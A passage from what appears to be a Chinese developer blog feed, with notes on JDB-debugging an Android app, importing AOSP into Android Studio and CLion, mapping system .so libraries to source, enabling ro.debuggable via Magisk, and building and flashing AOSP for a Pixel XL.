    <content type="html"><![CDATA[<h2 id="1-以调试模式运行APP"><a href="#1-以调试模式运行APP" class="headerlink" title="1. 以调试模式运行APP"></a>1. 以调试模式运行APP</h2><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">adb <span class="hljs-keyword">shell</span> <span class="hljs-keyword">am</span> start -D  <span class="hljs-keyword">com</span>.cola.jni/<span class="hljs-keyword">com</span>.cola.jni.MainActivity<br></code></pre></td></tr></table></figure><h2 id="2-转发端口到本地"><a href="#2-转发端口到本地" class="headerlink" title="2.转发端口到本地"></a>2.转发端口到本地</h2><p>使用<code>DDMS</code>转发端口</p> <img src="/2021/08/22/JDB%E8%B0%83%E8%AF%95APP/images/ddms.png" class=""><p>或者通过<code>adb</code>转发到本地</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">adb jdwp  <span class="hljs-comment">#获取可调试APP PID(判断目标APP是否可调试，将ro.debuggable设为1可调试所有APP)</span><br>adb forward tcp:<span class="hljs-number">8700</span> jdwp:$jdwp_pid<br></code></pre></td></tr></table></figure><h2 id="JDB附加"><a href="#JDB附加" class="headerlink" title="JDB附加"></a>JDB附加</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">jdb -connect com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.jdi</span><span class="hljs-selector-class">.SocketAttach</span>:hostname=<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>,port=<span class="hljs-number">8700</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>android</category>
      
    </categories>
    
    
    <tags>
      
      <tag>android</tag>
      
      <tag>jdb</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>AOSP导入IDE</title>
    <link href="/2021/08/22/AOSP%E5%AF%BC%E5%85%A5IDE/"/>
    <url>/2021/08/22/AOSP%E5%AF%BC%E5%85%A5IDE/</url>
    
    <content type="html"><![CDATA[<h2 id="Java代码导入-Android-Studio"><a href="#Java代码导入-Android-Studio" class="headerlink" title="Java代码导入 Android Studio"></a>Java代码导入 Android Studio</h2><h3 id="1-source-build-envsetup-sh"><a href="#1-source-build-envsetup-sh" class="headerlink" title="1.source build/envsetup.sh"></a>1.source build/envsetup.sh</h3><h3 id="2-编译生成-idegen-jar"><a href="#2-编译生成-idegen-jar" class="headerlink" title="2.编译生成 idegen.jar"></a>2.编译生成 idegen.jar</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">mmm development<span class="hljs-regexp">/tools/i</span>degen/ <br></code></pre></td></tr></table></figure><p>运行完毕上面的命令之后，就在根目录生成了2个文件：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">android.ipr </span>和 <span class="hljs-keyword">android.iml</span><br></code></pre></td></tr></table></figure><h3 id="3-排除不必要的模块，提高加载速度"><a href="#3-排除不必要的模块，提高加载速度" class="headerlink" title="3.排除不必要的模块，提高加载速度"></a>3.排除不必要的模块，提高加载速度</h3><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">打开<span class="hljs-keyword">android.iml, </span>找到excludeFolder属性,只添加framework<br></code></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;excludeFolder <span class="hljs-attribute">url</span>=<span class="hljs-string">&quot;file://<span class="hljs-variable">$MODULE_DIR</span>$/abi&quot;</span>/&gt;<br>&lt;excludeFolder <span class="hljs-attribute">url</span>=<span class="hljs-string">&quot;file://<span class="hljs-variable">$MODULE_DIR</span>$/art&quot;</span>/&gt;<br>&lt;excludeFolder <span class="hljs-attribute">url</span>=<span class="hljs-string">&quot;file://<span class="hljs-variable">$MODULE_DIR</span>$/bionic&quot;</span>/&gt;<br>&lt;excludeFolder <span class="hljs-attribute">url</span>=<span class="hljs-string">&quot;file://<span class="hljs-variable">$MODULE_DIR</span>$/bootable&quot;</span>/&gt;<br>&lt;excludeFolder <span class="hljs-attribute">url</span>=<span class="hljs-string">&quot;file://<span class="hljs-variable">$MODULE_DIR</span>$/build&quot;</span>/&gt;<br>&lt;excludeFolder <span class="hljs-attribute">url</span>=<span class="hljs-string">&quot;file://<span class="hljs-variable">$MODULE_DIR</span>$/cts&quot;</span>/&gt;<br>&lt;excludeFolder <span class="hljs-attribute">url</span>=<span class="hljs-string">&quot;file://<span class="hljs-variable">$MODULE_DIR</span>$/dalvik&quot;</span>/&gt;<br>&lt;excludeFolder <span class="hljs-attribute">url</span>=<span class="hljs-string">&quot;file://<span class="hljs-variable">$MODULE_DIR</span>$/developers&quot;</span>/&gt;<br>&lt;excludeFolder <span class="hljs-attribute">url</span>=<span class="hljs-string">&quot;file://<span class="hljs-variable">$MODULE_DIR</span>$/development&quot;</span>/&gt;<br>&lt;excludeFolder <span class="hljs-attribute">url</span>=<span class="hljs-string">&quot;file://<span class="hljs-variable">$MODULE_DIR</span>$/device&quot;</span>/&gt;<br>&lt;excludeFolder <span class="hljs-attribute">url</span>=<span class="hljs-string">&quot;file://<span class="hljs-variable">$MODULE_DIR</span>$/docs&quot;</span>/&gt;<br>&lt;excludeFolder <span class="hljs-attribute">url</span>=<span class="hljs-string">&quot;file://<span class="hljs-variable">$MODULE_DIR</span>$/external&quot;</span>/&gt;<br>&lt;excludeFolder <span class="hljs-attribute">url</span>=<span class="hljs-string">&quot;file://<span class="hljs-variable">$MODULE_DIR</span>$/hardware&quot;</span>/&gt;<br>&lt;excludeFolder <span class="hljs-attribute">url</span>=<span class="hljs-string">&quot;file://<span class="hljs-variable">$MODULE_DIR</span>$/libcore&quot;</span>/&gt;<br>&lt;excludeFolder <span class="hljs-attribute">url</span>=<span class="hljs-string">&quot;file://<span class="hljs-variable">$MODULE_DIR</span>$/libnativehelper&quot;</span>/&gt;<br>&lt;excludeFolder <span class="hljs-attribute">url</span>=<span class="hljs-string">&quot;file://<span class="hljs-variable">$MODULE_DIR</span>$/ndk&quot;</span>/&gt;<br>&lt;excludeFolder <span class="hljs-attribute">url</span>=<span class="hljs-string">&quot;file://<span class="hljs-variable">$MODULE_DIR</span>$/out&quot;</span>/&gt;<br>&lt;excludeFolder <span class="hljs-attribute">url</span>=<span class="hljs-string">&quot;file://<span class="hljs-variable">$MODULE_DIR</span>$/pdk&quot;</span>/&gt;<br>&lt;excludeFolder <span class="hljs-attribute">url</span>=<span class="hljs-string">&quot;file://<span class="hljs-variable">$MODULE_DIR</span>$/prebuilts&quot;</span>/&gt;<br>&lt;excludeFolder <span class="hljs-attribute">url</span>=<span class="hljs-string">&quot;file://<span class="hljs-variable">$MODULE_DIR</span>$/sdk&quot;</span>/&gt;<br>&lt;excludeFolder <span class="hljs-attribute">url</span>=<span class="hljs-string">&quot;file://<span class="hljs-variable">$MODULE_DIR</span>$/system&quot;</span>/&gt;<br>&lt;excludeFolder <span class="hljs-attribute">url</span>=<span class="hljs-string">&quot;file://<span class="hljs-variable">$MODULE_DIR</span>$/tools&quot;</span>/&gt;<br>&lt;excludeFolder <span class="hljs-attribute">url</span>=<span class="hljs-string">&quot;file://<span class="hljs-variable">$MODULE_DIR</span>$/kernel&quot;</span>/&gt;<br></code></pre></td></tr></table></figure><h3 id="4-使用Android-Studio直接android-ipr文件"><a href="#4-使用Android-Studio直接android-ipr文件" class="headerlink" title="4.使用Android Studio直接android.ipr文件"></a>4.使用Android Studio直接android.ipr文件</h3><h2 id="Native代码导入CLion"><a href="#Native代码导入CLion" class="headerlink" title="Native代码导入CLion"></a>Native代码导入CLion</h2><h3 id="1-打开开关，编译时生成CMakeLists-txt"><a href="#1-打开开关，编译时生成CMakeLists-txt" class="headerlink" title="1.打开开关，编译时生成CMakeLists.txt"></a>1.打开开关，编译时生成CMakeLists.txt</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">SOONG_GEN_CMAKEFILES</span>=1<br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">SOONG_GEN_CMAKEFILES_DEBUG</span>=1<br></code></pre></td></tr></table></figure><h3 id="2-编译"><a href="#2-编译" class="headerlink" title="2.编译"></a>2.编译</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">make</span> -j<span class="hljs-number">16</span><br></code></pre></td></tr></table></figure><h3 id="3-生成CMakeLists-txt"><a href="#3-生成CMakeLists-txt" class="headerlink" title="3.生成CMakeLists.txt"></a>3.生成CMakeLists.txt</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">out<span class="hljs-regexp">/development/i</span>de<span class="hljs-regexp">/clion/</span>xxxx<br></code></pre></td></tr></table></figure><h3 id="4-创建CMakeLists-txt用于合并"><a href="#4-创建CMakeLists-txt用于合并" class="headerlink" title="4. 创建CMakeLists.txt用于合并"></a>4. 创建CMakeLists.txt用于合并</h3><p><code>在clion目录下创建CMakeLists.txt</code></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">cmake_minimum_required</span><span class="hljs-params">(VERSION <span class="hljs-number">3.6</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">project</span><span class="hljs-params">(AOSP-Native)</span></span><br><br><span class="hljs-comment">//用到了哪个模块再导入即可，要保证改目录下有CMakeLists.txt</span><br><span class="hljs-comment">// 添加子模块，导入了部分工程</span><br><span class="hljs-function"><span class="hljs-title">add_subdirectory</span><span class="hljs-params">(frameworks/native)</span></span><br>.......<br></code></pre></td></tr></table></figure><h3 id="5-CLion导入"><a href="#5-CLion导入" class="headerlink" title="5. CLion导入"></a>5. CLion导入</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> 打开CLion<br><span class="hljs-bullet">2.</span> 选择「open xxxxxx」<br><span class="hljs-bullet">3.</span> 指定包含 CMakeLists.txt 的目录out/development/ide/clion<br><span class="hljs-bullet">4.</span> 选择「Open Existing Project」<br></code></pre></td></tr></table></figure><h3 id="6-更改工程根目录"><a href="#6-更改工程根目录" class="headerlink" title="6.更改工程根目录"></a>6.更改工程根目录</h3><p>设置root为aosp源码根目录</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xl">T<span class="hljs-function"><span class="hljs-title">ools</span> -&gt;</span> CM<span class="hljs-function"><span class="hljs-title">ake</span> -&gt;</span> Change Project Root<br></code></pre></td></tr></table></figure><h2 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h2><h3 id="交叉引用跳转到JDK源码"><a href="#交叉引用跳转到JDK源码" class="headerlink" title="交叉引用跳转到JDK源码"></a>交叉引用跳转到JDK源码</h3><p>打开的Java代码，查看集成关系或者调用关系的时候，还是会跳转到.class文件中，而不是相应的Java类?</p><h4 id="1-删除多余的JDK和SDK"><a href="#1-删除多余的JDK和SDK" class="headerlink" title="1. 删除多余的JDK和SDK"></a>1. 删除多余的JDK和SDK</h4> <img src="/2021/08/22/AOSP%E5%AF%BC%E5%85%A5IDE/images/%E5%88%A0%E9%99%A4%E5%A4%9A%E4%BD%99%E7%9A%84JDK%E5%92%8CSDK.png" class=""><h4 id="2-添加JDK"><a href="#2-添加JDK" class="headerlink" title="2. 添加JDK"></a>2. 添加JDK</h4> <img src="/2021/08/22/AOSP%E5%AF%BC%E5%85%A5IDE/images/%E6%B7%BB%E5%8A%A0sdk.png" class=""><h4 id="3-删除JDK中Classpath和Sourcepath中的内容"><a href="#3-删除JDK中Classpath和Sourcepath中的内容" class="headerlink" title="3. 删除JDK中Classpath和Sourcepath中的内容"></a>3. 删除JDK中Classpath和Sourcepath中的内容</h4> <img src="/2021/08/22/AOSP%E5%AF%BC%E5%85%A5IDE/images/%E5%88%A0%E9%99%A4Classpath.png" class=""><h4 id="4-删除SDK中Classpath和Sourcepath中的内容"><a href="#4-删除SDK中Classpath和Sourcepath中的内容" class="headerlink" title="4. 删除SDK中Classpath和Sourcepath中的内容"></a>4. 删除SDK中Classpath和Sourcepath中的内容</h4> <img src="/2021/08/22/AOSP%E5%AF%BC%E5%85%A5IDE/images/%E5%88%A0%E9%99%A4Sourcepath.png" class=""><h4 id="5-配置Modules"><a href="#5-配置Modules" class="headerlink" title="5. 配置Modules"></a>5. 配置Modules</h4> <img src="/2021/08/22/AOSP%E5%AF%BC%E5%85%A5IDE/images/%E9%85%8D%E7%BD%AEModules.png" class=""><h4 id="6把framework添加到Dependencies中"><a href="#6把framework添加到Dependencies中" class="headerlink" title="6把framework添加到Dependencies中"></a>6把framework添加到Dependencies中</h4> <img src="/2021/08/22/AOSP%E5%AF%BC%E5%85%A5IDE/images/framework%E6%B7%BB%E5%8A%A0%E5%88%B0Dependencies1.png" class=""><ul><li></li></ul> <img src="/2021/08/22/AOSP%E5%AF%BC%E5%85%A5IDE/images/framework%E6%B7%BB%E5%8A%A0%E5%88%B0Dependencies2.png" class=""><ul><li></li></ul> <img src="/2021/08/22/AOSP%E5%AF%BC%E5%85%A5IDE/images/framework%E6%B7%BB%E5%8A%A0%E5%88%B0Dependencies3.png" class=""><ul><li></li></ul> <img src="/2021/08/22/AOSP%E5%AF%BC%E5%85%A5IDE/images/framework%E6%B7%BB%E5%8A%A0%E5%88%B0Dependencies4.png" class=""><h4 id="7-确定Project-SDK选择正确"><a href="#7-确定Project-SDK选择正确" class="headerlink" title="7.  确定Project SDK选择正确"></a>7.  确定Project SDK选择正确</h4> <img src="/2021/08/22/AOSP%E5%AF%BC%E5%85%A5IDE/images/%E7%A1%AE%E5%AE%9AProjectSDK.png" class=""><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://www.jianshu.com/p/<span class="hljs-number">2</span>ba<span class="hljs-number">5</span>d<span class="hljs-number">6</span>bd<span class="hljs-number">461</span>e<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>android</category>
      
    </categories>
    
    
    <tags>
      
      <tag>android</tag>
      
      <tag>rom</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Android SO库与源码对应关系</title>
    <link href="/2021/08/22/Android-so%E5%BA%93%E4%B8%8E%E6%BA%90%E7%A0%81%E5%AF%B9%E5%BA%94%E5%85%B3%E7%B3%BB/"/>
    <url>/2021/08/22/Android-so%E5%BA%93%E4%B8%8E%E6%BA%90%E7%A0%81%E5%AF%B9%E5%BA%94%E5%85%B3%E7%B3%BB/</url>
    
    <content type="html"><![CDATA[<ul><li><p>libandroid.so     <code>frameworks/base/native/android</code></p></li><li><p>libandroid_runtime.so    <code>frameworks/base/core/jni</code></p></li><li><p>libandroidfw.so    <code>frameworks/base/libs/androidfw</code></p></li><li><p>libaudioutils.so    <code>system/media/audio_utils</code></p></li><li><p>libbinder.so    <code>frameworks/native/libs/binder</code></p></li><li><p>libbluedroid.so    <code>system/bluetooth/bluedroid</code></p></li><li><p>libc.so    <code>bionic/libc</code></p></li><li><p>libcamera_client.so    <code>frameworks/av/camera</code></p></li><li><p>libcorkscrew.so    <code>system/core/libcorkscrew</code></p></li><li><p>libcpustats.so    <code>frameworks/native/libs/cpustats</code></p></li><li><p>libcrypto.so    <code>external/openssl</code></p></li><li><p>libcutils.so    <code>system/core/libcutils</code></p></li><li><p>libdbus.so    <code>external/dbus/dbus</code></p></li><li><p>libdvm.so    <code>dalvik/vm</code></p></li><li><p>libart.so    <code>art/runtime</code></p></li><li><p>libemoji.so    <code>frameworks/opt/emoji</code></p></li><li><p>libETC1.so    <code>frameworks/native/opengl/libs</code></p></li><li><p>libgccdemangle    <code>external/gcc-demangle</code></p></li><li><p>libgui.so    <code>frameworks/native/libs/gui</code></p></li><li><p>libgabi++.so    <code>abi/cpp</code></p></li><li><p>libGLESv1_CM.so    <code>frameworks/native/opengl/libs</code></p></li><li><p>libharfbuzz.so    <code>external/harfbuzz</code></p></li><li><p>libhwui.so    <code>frameworks/base/libs/hwui</code></p></li><li><p>libhardware_legacy.so    <code>hardware/libhardware_legacy</code></p></li><li><p>libjpeg.so    <code>external/jpeg</code></p></li><li><p>libmedia.so    <code>frameworks/av/media/libmedia</code></p></li><li><p>libmedia_native.so    <code>frameworks/av/media/libmedia_native</code></p></li><li><p>libnetutils.so    <code>system/core/libnetutils</code></p></li><li><p>libstagefright_foundation.so    <code>frameworks/av/media/libstagefright/foundation</code></p></li><li><p>libsonivox.so    <code>external/sonivox</code></p></li><li><p>libspeexresampler    <code>external/speex</code></p></li><li><p>libstlport.so    <code>external/stlport</code></p></li><li><p>libssl.so    <code>external/openssl</code></p></li><li><p>libui.so    <code>frameworks/native/libs/ui</code></p></li><li><p>libutils.so    <code>frameworks/native/libs/utils</code></p></li><li><p>libusbhost.so    <code>system/core/libusbhost</code></p></li></ul>]]></content>
    
    
    <categories>
      
      <category>android</category>
      
    </categories>
    
    
    <tags>
      
      <tag>android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Magisk开启ro.debuggable调试</title>
    <link href="/2021/08/22/Magisk%E5%BC%80%E5%90%AFro-debuggable%E8%B0%83%E8%AF%95/"/>
    <url>/2021/08/22/Magisk%E5%BC%80%E5%90%AFro-debuggable%E8%B0%83%E8%AF%95/</url>
    
    <content type="html"><![CDATA[<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">magisk resetprop ro.debuggable <span class="hljs-number">1</span><br><span class="hljs-comment">#查看ro.debuggable</span><br>getprop ro.debuggable<br><span class="hljs-comment">#重启</span><br>stop;start<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>android</category>
      
    </categories>
    
    
    <tags>
      
      <tag>android</tag>
      
      <tag>magisk</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pixel XL AOSP源码编译</title>
    <link href="/2021/08/22/pixel-XL-AOSP%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/"/>
    <url>/2021/08/22/pixel-XL-AOSP%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/</url>
    
    <content type="html"><![CDATA[<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><ul><li>操作系统 ：虚拟机 ubuntu 16.04</li><li>内存 ：12G</li><li>硬盘 ：150G</li><li>CPU ：4核</li></ul><h2 id="编译过程"><a href="#编译过程" class="headerlink" title="编译过程"></a>编译过程</h2><h3 id="1-源码分支获取"><a href="#1-源码分支获取" class="headerlink" title="1. 源码分支获取"></a>1. 源码分支获取</h3><p>根据手机型号下载对应的版本，通过以下网站获取pixel XL android 10版本的源码标记 android-10.0.0_r17</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">https://source.android.com/setup/start/build-numbers#source-code-tags-and-builds<br></code></pre></td></tr></table></figure> <img src="/2021/08/22/pixel-XL-AOSP%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/images/%E6%BA%90%E7%A0%81%E5%88%86%E6%94%AF%E8%8E%B7%E5%8F%96.png" class=""><h3 id="2-下载android源码"><a href="#2-下载android源码" class="headerlink" title="2.下载android源码"></a>2.下载android源码</h3><p>repo</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">sudo apt-get install git-core<br>sudo apt-get install git-core curl<br>mkdir ~/<span class="hljs-built_in">bin</span>/<br>cd ~/<span class="hljs-built_in">bin</span><br><br>curl https://mirrors.tuna.tsinghua.edu.cn/git/git-repo &gt; ~/<span class="hljs-built_in">bin</span>/repo<br>chmod a+x ~/<span class="hljs-built_in">bin</span>/repo<br>gedit ~/.bashrc<br></code></pre></td></tr></table></figure><p>在~/.bashrc里添加</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#国内镜像</span><br>export REPO_URL=<span class="hljs-string">&#x27;https://aosp.tuna.tsinghua.edu.cn/git-repo&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="3-同步代码"><a href="#3-同步代码" class="headerlink" title="3. 同步代码"></a>3. 同步代码</h3><h4 id="3-1-第一种方式"><a href="#3-1-第一种方式" class="headerlink" title="3.1 第一种方式"></a>3.1 第一种方式</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">cd ~/work/sources/android-<span class="hljs-number">10.0</span><span class="hljs-number">.0</span>_r17<br>repo init -u https://aosp.tuna.tsinghua.edu.cn/platform/manifest -b android-<span class="hljs-number">10.0</span><span class="hljs-number">.0</span>_r17<br>repo sync -c --no-tags --prune -f -j4  <span class="hljs-comment">#线程根据cpu核数决定 一般为cpu核数x2，此处采用4线程</span><br></code></pre></td></tr></table></figure><p>参数介绍:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs //参数说明">-c, --current-branch fetch only current branch from server.<br>这个选项指定只获取执行 repo init 时 -b 选项所指定的分支，不会获取远端服务器的分支信息。<br>例如服务器上新增了其他分支，使用 -c 选项同步后，在本地 git 仓库执行 git branch -r 命令看不到服务器新增的分支名。如果不加 -c 选项，那么同步的时候，会打印 [new branch] 这样的信息，使用 git branch -r 命令可查看到服务器新增的分支。<br><br>–no-tags don’t fetch tags.<br>该选项指定不获取服务器上的tag信息。<br><br>–prune delete refs that no longer exist on the remote.<br>如果远端服务器已经删除了某个分支，在 repo sync 时加上 --prune 选项，可以让本地仓库删除对这个分支的跟踪引用。<br><br>-j JOBS, --jobs=JOBS projects to fetch simultaneously (default 2).<br>指定启用多少个线程来同步。<br>例如上面的 -j 4 指定用4个线程来同步。如果没有提供该选项，默认是用2个线程。<br><br>-f：即使某个项目同步失败，也继续同步其他项目。<br><br>总的来说，在 repo sync -c --no-tags --prune -j 4 命令中，使用 -c 和 --no-tags 选项可以减少需要同步的内容，从而减少要占用的本地代码空间，也可以减少一些同步时间。<br>使用 -j 选项来指定启用多线程进行同步，可以加快执行速度，也就减少了同步时间。<br>使用 --prune 选项去掉已删除分支的跟踪引用，一般不会用到，这个选项可加可不加。<br></code></pre></td></tr></table></figure><h4 id="3-1-第二种方式-未尝试此方法不知道是否可行"><a href="#3-1-第二种方式-未尝试此方法不知道是否可行" class="headerlink" title="3.1 第二种方式(未尝试此方法不知道是否可行)"></a>3.1 第二种方式(未尝试此方法不知道是否可行)</h4><p>下载源码的初始化包（加速源码下载） 大约60G</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">wget https:<span class="hljs-regexp">//mi</span>rrors.tuna.tsinghua.edu.cn<span class="hljs-regexp">/aosp-monthly/</span>aosp-latest.tar<br></code></pre></td></tr></table></figure><p>解压缩,解压缩完成之后会多出来~/aosp目录<br>切进去</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">tar</span> zxvf aosp-latest.tar<br></code></pre></td></tr></table></figure><p>cd  aosp </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">repo init -u https://aosp.tuna.tsinghua.edu.cn/platform/manifest -b android-<span class="hljs-number">10.0</span><span class="hljs-number">.0</span>_r17<br>repo sync -c --no-tags --prune -f -j4  <span class="hljs-comment">#线程根据cpu核数决定 一般为cpu核数x2，此处采用4线程</span><br></code></pre></td></tr></table></figure><h3 id="4-驱动下载"><a href="#4-驱动下载" class="headerlink" title="4. 驱动下载"></a>4. 驱动下载</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>developers.google.com<span class="hljs-regexp">/android/</span>drivers<span class="hljs-comment">#sailfishqp1a.190711.020</span><br></code></pre></td></tr></table></figure><p>下载google_devices-sailfish-qp1a.191005.007.a3-a1615a0f.tgz</p><p>qcom-sailfish-qp1a.191005.007.a3-191228fe.tgz<br>两个压缩包，191005.007.a3为当时最新版本驱动</p> <img src="/2021/08/22/pixel-XL-AOSP%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/images/%E9%A9%B1%E5%8A%A8%E4%B8%8B%E8%BD%BD.png" class=""><p>下载完成后解压会获得两个.sh脚本文件，运行两个脚本后会生成vendor文件夹，将vendor文件夹拷贝到<strong>源码根目录</strong>下</p><h3 id="5-编译环境"><a href="#5-编译环境" class="headerlink" title="5. 编译环境"></a>5. 编译环境</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt-get install git-core openjdk-8-jdk gnupg flex bison gperf build-essential zip curl zlib1g-dev gcc-multilib g++-multilib libc6-dev-i386 lib32ncurses5-dev x11proto-core-dev libx11-dev lib32z-dev ccache libxml2-utils xsltproc unzip<br></code></pre></td></tr></table></figure><h3 id="6-编译脚本准备"><a href="#6-编译脚本准备" class="headerlink" title="6. 编译脚本准备"></a>6. 编译脚本准备</h3><p>进去源码根目录下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">source ./build/envsetup.sh <br>lunch aosp_sailfish-userdebug <span class="hljs-comment">#也可以命令行lunch回车稍等片刻输入 然后输入15即可</span><br><br><span class="hljs-comment">#调整一个Java参数，要不然会出现Java OOM错误</span><br>export JACK_SERVER_VM_ARGUMENTS=<span class="hljs-string">&quot;-Dfile.encoding=UTF-8 -XX:+TieredCompilation -Xmx4096m&quot;</span><br><br></code></pre></td></tr></table></figure><p>注: 我们可以在aosp/build/tools/buildinfo.sh  vendor_buildinfo.sh 这两个文件中直接修改手机品牌的名字,厂家等信息</p><h3 id="7-开始编译"><a href="#7-开始编译" class="headerlink" title="7. 开始编译"></a>7. 开始编译</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">make -j6   <span class="hljs-comment">#线程视配置而定</span><br><br><span class="hljs-comment">#编译的结果在 ~/aosp/out/target/product/marlin 文件夹中</span><br><span class="hljs-comment">#比较重要的几个是：</span><br><br>boot.img<br>recovery.img<br>ramdisk.img<br>system.img<br>userdata.img<br></code></pre></td></tr></table></figure><h3 id="8-刷机"><a href="#8-刷机" class="headerlink" title="8. 刷机"></a>8. 刷机</h3><p>回到源码根目录下输入</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">fastboot flashall -w</span><br></code></pre></td></tr></table></figure><p>注 lanch命令为我们设置好了ANDROID_PRODUCT_OUT变量的值为编译文件目录确保它的值和编译后镜像输出目录的路径值一致。如果不一致的话，重新设置ANDROID_PRODUCT_OUT的值与编译后镜像输出目录路径值一致。 </p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="fastboot"><a href="#fastboot" class="headerlink" 